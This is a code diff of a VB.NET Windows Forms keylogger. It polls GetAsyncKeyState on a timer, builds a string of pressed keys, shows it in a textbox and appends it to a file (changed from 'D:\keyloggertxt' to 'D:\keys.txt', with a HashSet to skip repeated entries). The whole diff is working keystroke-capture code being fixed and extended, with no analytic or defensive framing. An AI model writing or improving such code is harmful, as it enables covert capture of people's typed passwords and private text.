@@ -3,16 +3,15 @@
 Public Class Form1
     Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
     Public Log As String
+    Private ReadOnly keysPressed As New HashSet(Of String)()
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-
         Timer1.Start()
-
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         If (GetAsyncKeyState(65)) Then
-
+            Log = Log + "A"
         ElseIf (GetAsyncKeyState(66)) Then
             Log = Log + "B"
         ElseIf (GetAsyncKeyState(67)) Then
@@ -169,8 +168,12 @@ Public Class Form1
             Log = Log + "{F3}"
         End If
         TextBox1.Text = Log
-        Dim sw As New System.IO.StreamWriter("D:\keyloggertxt", True)
-        sw.WriteLine(Log)
-        sw.Close()
+        If Not keysPressed.Contains(Log) Then
+            keysPressed.Add(Log)
+            File.AppendAllText("D:\keys.txt", Log)
+        End If
+        'Dim sw As New System.IO.StreamWriter("D:\keyloggertxt", True)
+        'sw.WriteLine(Log)
+        'sw.Close()
     End Sub
 End Class
